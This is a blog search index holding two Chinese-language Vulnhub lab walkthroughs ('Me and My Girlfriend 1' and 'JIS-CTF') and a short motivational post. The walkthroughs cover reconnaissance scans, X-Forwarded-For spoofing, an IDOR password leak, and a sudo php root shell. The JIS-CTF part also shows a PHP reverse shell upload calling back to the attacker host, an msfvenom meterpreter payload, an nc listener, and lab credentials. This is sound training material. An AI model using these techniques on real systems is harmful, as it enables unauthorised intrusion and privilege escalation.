<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vulnhub靶机——Me and My Girlfirend1</title>
      <link href="/2020/03/03/Me-and-My-Girlfirend1/"/>
      <url>/2020/03/03/Me-and-My-Girlfirend1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2020-02-10-22</p></blockquote><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, &quot;Ceban Corp&quot;, something has changed from Alice&#39;s attitude towards Bob like something is &quot;hidden&quot;, And Bob asks for your help to get what Alice is hiding and get full access to the company!</span><br><span class="line"></span><br><span class="line">Difficulty Level: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there are 2 flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br><span class="line"></span><br><span class="line">From : https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;me-and-my-girlfriend-1,409&#x2F;</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.56.109</span><br><span class="line"></span><br><span class="line">目标网段：192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure><br><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br><p>显示主机存活扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><br><p><img src="image-20200210204802372.png" alt="image-20200210204802372"> </p><br><p>排除本机与网关后，找出目标机，扫服务/端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure><br><p>访问 <code>80</code> 端口的 Web页面。显示只有 <code>local</code> 地址才能访问，看源代码，作者给出提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Maybe you can search how to use x-forwarded-for --&gt;</span></span><br></pre></td></tr></table></figure><br><p><code>x-forwarded-for</code> ：用来识别通过 HTTP代理或负载均衡方式连接到 Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段（就是服务器用来识别客户端原始 IP 地址的）</p><br><p>改请求头，添加字段：<code>x-forwarded-for：localhost</code> ，返回页面信息（建议使用 Burp）</p><br><p><img src="2020-02-10%2018-50-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="postman"> </p><p><img src="2020-02-10%2020-58-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><hr><p><strong>NOTE</strong> ： 这里犯了一个错误，在查 <code>x-forwarded-for</code> 的时候，偶然看到了 <code>Postman</code> 也就是上图中的软件，下载、使用、测试浪费了许多时间，且最后越来越麻烦（提交表格、登录），最后便放弃了</p><br><p>不是说上图的软件不好用或难用，而是对其一点都不熟悉，不懂套路；<code>Burp</code> 使用不熟练 </p><p>在 Burp 上有更方便的操作方式，后来改之</p><br><hr><br><p>通过改 <code>x-forwarded-for</code> 值，达到了欺骗服务器并返回数据，页面源代码并无有价值信息</p><br><p>既然是 Web 那便开始扫目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.111 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://192.168.56.111</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.111</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2018-46-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2018-48-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>得到地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/config/</span><br><span class="line">http://192.168.56.111/index.php/login/</span><br><span class="line">http://192.168.56.111/misc/</span><br><span class="line">http://192.168.56.111/robots.txt        <span class="comment">## /heyhoo.txt  </span></span><br><span class="line">http://192.168.56.111/server-status     <span class="comment">## 404</span></span><br><span class="line">http://192.168.56.111/heyhoo.txt        <span class="comment">### null</span></span><br></pre></td></tr></table></figure><p>经访问，下面两个地址返回 <code>200 OK</code> 但却空白，一般是后续填充内容使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/config/config.php   <span class="comment"># 200 OK 返回空白</span></span><br><span class="line">http://192.168.56.111/misc/process.php      <span class="comment"># 200 OK 返回空白</span></span><br></pre></td></tr></table></figure><p><code>robot.txt</code> 只有一个限制地址，访问并无又有用价值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/heyhoo.txt</span><br><span class="line"></span><br><span class="line">http://192.168.56.111/heyhoo.txt<span class="comment"># 无有用信息</span></span><br></pre></td></tr></table></figure><br><p>最后的几个地址，需要通过修改 <code>x-forwarded-for</code> 值才能访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/index.php/login/?page=index<span class="comment"># Index</span></span><br><span class="line"> </span><br><span class="line">?page=login     <span class="comment">### 登录页面</span></span><br><span class="line">?page=about     <span class="comment">#### 无有价值信息</span></span><br><span class="line">?page=register  <span class="comment">## 注册页面</span></span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2021-37-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>注册后跳转登录，有三个选项， <code>Dahboard</code> 与 <code>Logout</code> 无甚作用，<code>Profile</code> 会显示你的账号信息</p><p>看源代码，除密码为明文，无其他有价值信息。</p><br><p>其实，跳转到 <code>Profile</code> 页的时候，就已经注意到 URL 了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.111/misc/process.php?page=profile&amp;user_id=14</span><br></pre></td></tr></table></figure><br><p><code>sqlmap</code> 并没有跑出什么，到时在改变数字的时候，底下会出现其他用户的信息</p><br><p>从一开始，挨个访问，到 <code>5</code> 的时候，出现了用户名为：<code>alice</code> 的用户，也就是 <code>GirlFriend</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: Alice Geulis</span><br><span class="line">username: alice</span><br><span class="line">passwd: 4lic3</span><br></pre></td></tr></table></figure><br><br><p><img src="2020-02-10%2021-43-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2019-33-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p>登录 SSH 成功，访问目录得到隐藏文件和 FLAG1。然后就可以提权了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag 1 : gfriEND&#123;2f5f21b2af1b8c3e227bcf35544f8f09&#125;</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2019-48-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><br><p>执行 <code>sudo -l</code> ，发现了可以使用 <code>php</code> ，执行以下命令，直接提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMD=<span class="string">"/bin/sh"</span></span><br><span class="line">sudo php -r <span class="string">"system('<span class="variable">$CMD</span>');"</span></span><br></pre></td></tr></table></figure><p>得到 FLAG2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thanks! Flag 2: gfriEND&#123;56fbeef560930e77ff984b644fde66e7&#125;</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2022-01-37%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2020-24-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2020-23-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub靶机——JIS-CTF</title>
      <link href="/2020/03/03/JIS-CTF/"/>
      <url>/2020/03/03/JIS-CTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2020-02-10-15</p></blockquote><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">VM Name: JIS-CTF : VulnUpload</span><br><span class="line"></span><br><span class="line">Difficulty: Beginner</span><br><span class="line"></span><br><span class="line">Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags.</span><br><span class="line"></span><br><span class="line">Only working with VirtualBox </span><br><span class="line"></span><br><span class="line">Url : https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;jis-ctf-vulnupload,228&#x2F;</span><br></pre></td></tr></table></figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali：192.168.56.109</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标网段：192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure><br><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br><p>扫描主机存活获取目标地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2013-50-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>排除本机与网关还有两个，扫服务确定目标 IP ： <code>192.168.56.110</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.110</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 10:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.110</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">MAC Address: 08:00:27:C2:CD:2E (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.15 seconds</span><br></pre></td></tr></table></figure><br><p>浏览器访问如下：</p><br><p><img src="2020-02-10%2013-55-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>网站的话，需要先收集一下目录信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.110 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2009-31-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://192.168.56.110</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.110</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2009-32-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""></p><p><img src="2020-02-10%2009-33-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-1581314672000.png" alt=""> </p><br><p><code>robots</code> 总会有些东西泄露：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /admin<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /admin_area<span class="comment"># ----- OK 200</span></span><br><span class="line">Disallow: /r00t<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /uploads      <span class="comment"># ----- Not Found 404</span></span><br><span class="line">Disallow: /uploaded_files <span class="comment"># ----- OK 200</span></span><br><span class="line">Disallow: /flag <span class="comment"># ----- OK 200</span></span><br></pre></td></tr></table></figure><p>逐一访问后得到可用目录如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.110/index.php<span class="comment"># 主页</span></span><br><span class="line">http://192.168.56.110/flag/<span class="comment"># OK</span></span><br><span class="line">http://192.168.56.110/assets<span class="comment"># 引用资源页面，包含图片（疑似有内容，先搁置）</span></span><br><span class="line">http://192.168.56.110/admin_area/<span class="comment"># OK</span></span><br><span class="line">http://192.168.56.110/robots.txt<span class="comment"># robots</span></span><br><span class="line">http://192.168.56.110/uploaded_files<span class="comment"># 疑似与文件上传有关</span></span><br></pre></td></tr></table></figure><br><p>访问 <code>/flag</code> 得到 第一个 Flag ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br></pre></td></tr></table></figure><br><p>访问 <code>uploaded_files</code> 空白页，但返回 <code>200 OK</code> 。无源代码</p><br><p>访问 <code>admin_area</code> ，源代码内发现第二个 Flag 及一组用户名密码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--username : admin</span></span><br><span class="line"><span class="comment">password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="comment">The 2nd flag is : &#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><br><h2 id="打开大门"><a href="#打开大门" class="headerlink" title="打开大门"></a>打开大门</h2><br><p>使用得到的用户名密码登录 SSH 无效，但成功登录 Web 页面，一个文件上传服务：</p><br><p><img src="2020-02-10%2009-36-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>上传照片返回成功，上传 <code>php</code> 页面也成功，可知并没有黑白名单</p><p>可以上传一句话木马 + Nc 或用 <code>msfvenom</code> 生成 MSF 的 php 反弹木马</p><br><p><strong>使用 kali 上的木马</strong>  （<code>/usr/share/webshell</code>）</p><br><ul><li><code>cp /usr/share/webshell/php/php-reverse-shell.php ~/Desktop/php-shell.php</code> </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ip = <span class="string">'192.168.56.109'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">8848</span>;       <span class="comment">// CHANGE THIS</span></span><br></pre></td></tr></table></figure><br><p>监听端口。访问：<code>http://192.168.56.110/uploaded_files/php-shell.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 8848</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2014-50-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p><strong>使用 MSF 的 php 反弹木马</strong> </p><br><p>生成木马，并监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.109 LPORT=8848 --format raw --out /root/桌面/msf_php.php</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2010-42-35%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2010-48-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>查看 Web的根目录，从 <code>hint.txt</code> 找到了第三个 FLAG，并说明了使用 <code>technawi</code>  的用户才可以读取 <code>flag.txt</code> 且在一个隐藏目录里面</p><br><p><img src="2020-02-10%2010-51-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2011-01-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>查看 <code>/etc/passwd</code> 除了 <code>technawi</code> 的 HOME 目录，无其他有用信息</p><br><p>那就搜索文件中包含 <code>technawi</code> 关键字的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user <span class="string">"technawi"</span> -<span class="built_in">type</span> f ! -path <span class="string">"/proc/*"</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">grep -ri --exclude-dir=proc/ <span class="string">'technawi'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br><p><img src="2020-02-10%2011-15-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><p>发现了一个 MySQL 的 认证TXT，找到第四个 FLAG 附带一组账号密码，成功登录 SSH，并拿到最后一个 FLAG</p><br><p><img src="2020-02-10%2011-16-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><p><img src="2020-02-10%2011-31-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><h2 id="提权-额外"><a href="#提权-额外" class="headerlink" title="提权(额外)"></a>提权(额外)</h2><br><p>其中，<code>technawi</code> HOME 目录下有个名为 <code>.sudo_as_admin_successful</code> 的文件，</p><p>意味着 <code>technawi</code> 可以用自己的密码登录成为 root 用户（提权）</p><br><p><img src="2020-02-10%2011-34-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt=""> </p><br><hr><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.110/robots.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /admin_area</span><br><span class="line">Disallow: /r00t</span><br><span class="line">Disallow: /uploads      ----- Not Found 404</span><br><span class="line">Disallow: /uploaded_files ----- OK 200</span><br><span class="line">Disallow: /flag </span><br><span class="line">================</span><br><span class="line">http://192.168.56.110/admin_area/</span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">&lt;!--username : admin</span><br><span class="line">password : 3v1l_H@ck3r</span><br><span class="line">The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/assets/img/</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">[IMG]background_tile_1.jpg2017-04-19 10:43 2.3K </span><br><span class="line">[IMG]background_tile_2.jpg2017-04-19 10:43 2.4K </span><br><span class="line">[IMG]background_tile_3.jpg2017-04-19 10:43 2.3K </span><br><span class="line">[IMG]blue_line.jpg2017-04-19 10:43 1.3K </span><br><span class="line">[IMG]done.png2017-04-19 10:43 3.3K </span><br><span class="line">[IMG]logo.jpg2017-04-19 10:43 11K </span><br><span class="line">[IMG]tzine.png2017-04-19 10:43 1.2K </span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/flag/</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/server-status</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">注意 Cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">http://192.168.56.110/index.php</span><br><span class="line"></span><br><span class="line">登录后：</span><br><span class="line"></span><br><span class="line">Powered by : Technawi[dot]net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">meterpreter &gt; cat hint.txt</span><br><span class="line">try to find user technawi password to <span class="built_in">read</span> the flag.txt file, you can find it <span class="keyword">in</span> a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">cat /etc/mysql/conf.d/credentials.txt</span><br><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : technawi</span><br><span class="line">password : 3vilH@ksor</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">technawi@Jordaninfosec-CTF01:~$ cat /var/www/html/flag.txt </span><br><span class="line">The 5th flag is : &#123;5473215946785213456975249&#125;</span><br><span class="line"></span><br><span class="line">Good job :)</span><br><span class="line"></span><br><span class="line">You find 5 flags and got their points and finish the first scenario....</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Try Harder</title>
      <link href="/2020/02/29/Test/"/>
      <url>/2020/02/29/Test/</url>
      
        <content type="html"><![CDATA[<br><p>新的一年，新的挑战，新的目标，为了这个目标，Try Harder</p><br>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
